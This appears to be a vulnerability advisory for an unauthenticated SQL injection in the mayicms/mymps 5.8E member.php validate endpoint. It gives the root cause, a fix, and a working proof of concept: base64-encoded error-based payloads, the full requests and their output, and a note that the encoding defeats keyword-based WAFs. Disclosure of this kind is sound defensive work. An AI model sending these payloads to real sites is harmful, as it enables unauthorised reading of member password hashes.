# mayicms 5.8E member.php?mod=validate base64-decoded Unauthenticated SQL Injection

Product: mayicms / mymps (马蚁分类信息系统) 5.8E and earlier
Endpoint: GET /member.php?mod=validate&code=<base64(payload)>
CWE-89

## Root cause
member.php case 'validate': base64_decode($code) → explode('.') → $uid not
intval()'d, concatenated into WHERE id='$uid'. Global maddslashes applies to
base64 text (no quotes in alphabet) so it is a no-op.

## PoC (read-only, live-verified 2026-10-26)

Step 1 - confirm injection (code = base64("1'") = MSc=):
GET /member.php?mod=validate&code=MSc%3D
→ 1064 SQL syntax error

Step 2 - extract DB version (plaintext payload, then base64):
  1' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1)-- -
base64: MScgQU5EIFVQREFURVhNTCgxLENPTkNBVCgweDdlLEBAdmVyc2lvbiwweDdlKSwxKS0tIC0=
GET /member.php?mod=validate&code=MScgQU5EIFVQREFURVhNTCgxLENPTkNBVCgweDdlLEBAdmVyc2lvbiwweDdlKSwxKS0tIC0%3D
→ XPATH syntax error: '~5.7.26~'

database() → '~pchui~'   user() → '~root@localhost~'

## Impact
Unauthenticated read of member table (userpwd hashes). Payload travels
base64-encoded so plaintext SQL keywords never appear in HTTP traffic,
defeating keyword-based WAFs.

## Distinct from CVE-2025-4514
That CVE covers /javascript.php `value` parameter. This is member.php
`code` parameter on a separate code path (mod=validate). Different file,
different parameter, unauthenticated. Not a duplicate.

Fix: intval() the decoded uid, use prepared statements.
